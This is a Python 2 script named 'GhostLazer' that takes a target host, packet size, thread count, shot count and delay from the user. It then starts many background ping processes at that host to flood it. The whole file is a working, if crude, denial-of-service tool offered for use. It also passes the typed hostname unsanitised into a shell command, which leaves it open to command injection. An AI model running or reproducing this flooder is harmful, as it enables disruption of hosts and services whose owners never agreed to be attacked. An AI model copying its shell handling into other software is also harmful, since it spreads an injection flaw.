import os
redoo = 1
while (redoo == 1):	
	os.system('clear')
	print("""\033[91m\033[1m[GhostLazer]""")
	print("""\033[91m\033[1m[Developer: Hari Patel @ hari.p.2212@gmail.com]\n[Github: https://github.com/Hari-P-22121/GhostLazer]\033[0;0m
\033[1m""")
	hostName = raw_input('Enter IP/Hostname: ')
	if (hostName > ''):
		redoo = 0
os.system('clear')
redoo = 1
while (redoo == 1):
	os.system('clear')
	print("""\033[91m\033[1m[GhostLazer]""")
	print("""\033[91m\033[1m[Developer: Hari Patel @ hari.p.2212@gmail.com]\n[Github: https://github.com/Hari-P-22121/GhostLazer]\033[0;0m
\033[1m""")
	byteNumber = raw_input('Enter number of bytes to send per thread: MAX: 8000 ')
	try:
		byteNumber = int(byteNumber)
		byteNumber = byteNumber - 8
		redoo = 0
		if 0 < byteNumber < 8000:
			redoo = 0
		else:
			redoo = 1
	except:
		redoo = 1
os.system('clear')
redoo = 1
while (redoo == 1):
	os.system('clear')
	print("""\033[91m\033[1m[GhostLazer]""")
	print("""\033[91m\033[1m[Developer: Hari Patel @ hari.p.2212@gmail.com]\n[Github: https://github.com/Hari-P-22121/GhostLazer]\033[0;0m
\033[1m""")
	threadNumber = raw_input('Enter number of threads: ')
	try:
		threadNumber = int(threadNumber)
		redoo = 0
	except:
		redoo = 1
os.system('clear')
redoo = 1
while (redoo == 1):
	os.system('clear')
	print("""\033[91m\033[1m[GhostLazer]""")
	print("""\033[91m\033[1m[Developer: Hari Patel @ hari.p.2212@gmail.com]\n[Github: https://github.com/Hari-P-22121/GhostLazer]\033[0;0m
\033[1m""")
	numTimes = raw_input('Enter number of times to fire lazer: ')
	try:
		numTimes = int(numTimes)
		redoo = 0
	except:
		redoo = 1
os.system('clear')
redoo = 1
while (redoo == 1):
	os.system('clear')
	print("""\033[91m\033[1m[GhostLazer]""")
	print("""\033[91m\033[1m[Developer: Hari Patel @ hari.p.2212@gmail.com]\n[Github: https://github.com/Hari-P-22121/GhostLazer]\033[0;0m
\033[1m""")
	delayy = raw_input('Enter delay between each shot: (MIN: 0.1 seconds) ')
	try:
		delayy = int(delayy)
		redoo = 0
	except:
		redoo = 1
	if delayy < 0.1:
		redoo = 1
	else:
		redoo = 0
os.system('clear')
byteNumber = str(byteNumber)
threadNumber = str(threadNumber)
delayy = str(delayy)
numTimes = str(numTimes)
threadNumberr = int(threadNumber)
x = 0
while True:
	os.system('ping -s ' + byteNumber + ' -c ' + numTimes + ' -i ' + delayy + ' ' + hostName + ' > /dev/null 2>&1 &')
	x = x + 1
	if x == threadNumberr:
		break
